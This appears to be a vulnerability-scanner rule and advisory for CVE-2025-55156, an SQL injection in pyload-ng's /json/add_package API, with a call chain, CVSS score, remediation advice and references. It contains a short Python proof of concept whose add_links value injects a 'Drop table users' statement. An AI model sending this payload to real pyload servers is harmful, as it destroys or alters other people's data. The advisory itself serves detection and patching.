info:
  name: pyload-ng
  cve: CVE-2025-55156
  summary: SQL Injection vulnerability in pyload-ng via API /json/add_package
  details: |
    The `add_links` parameter in the `/json/add_package` API endpoint is vulnerable to SQL injection. 
    This occurs due to unsafe handling of user input in the `update_link_info` function in 
    `src/pyload/core/database/file_database.py`, where unsanitized data is directly interpolated into an SQL query.
    An attacker can exploit this to execute arbitrary SQL commands, potentially leading to unauthorized data access, modification, or deletion.
    **Vulnerability Chain**:
    ```
    josn_blueprint.py#add_package
    → src/pyload/core/api/__init__.py#add_package
    → src/pyload/core/managers/file_manager.py#add_links
    → src/pyload/core/threads/info_thread.py#run
    → src/pyload/core/threads/info_thread.py#update_info
    → src/pyload/core/managers/file_manager.py#update_file_info
    → src/pyload/core/database/file_database.py#update_link_info
    ```
    **Proof of Concept (PoC)**:
    ```python
    import requests
    if __name__ == "__main__":
        url = "http://localhost:8000/json/add_package"
        data = {
            "add_name": "My Downloads1",
            "add_dest": "0",
            "add_links": "https://www.dailymotion.com/video/x8zzzzz') or 1; Drop table users;--",
            "add_password": "mypassword"
        }
        response = requests.post(url, cookies=your_cookies, data=data)
        print(response.status_code, response.text)
    ```
  cvss: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P
  severity: HIGH
  security_advise: |
    1. Upgrade to version `pyload-ng>=0.5.0b3.dev91`.
    2. Sanitize and validate all user inputs, especially those used in SQL queries.
    3. Use parameterized queries or ORM methods to prevent direct string interpolation in SQL statements.
    4. Review and audit database interaction code for similar patterns of unsafe query construction.
rule: version >= "0" && version < "0.5.0b3.dev91"
references:
  - https://github.com/pyload/pyload/security/advisories/GHSA-pwh4-6r3m-j2rf
  - https://nvd.nist.gov/vuln/detail/CVE-2025-55156
  - https://github.com/pyload/pyload/commit/134edcdf6e2a10c393743c254da3d9d90b74258f
  - https://github.com/pyload/pyload
  - https://github.com/pyload/pyload/blob/develop/src/pyload/core/database/file_database.py#L271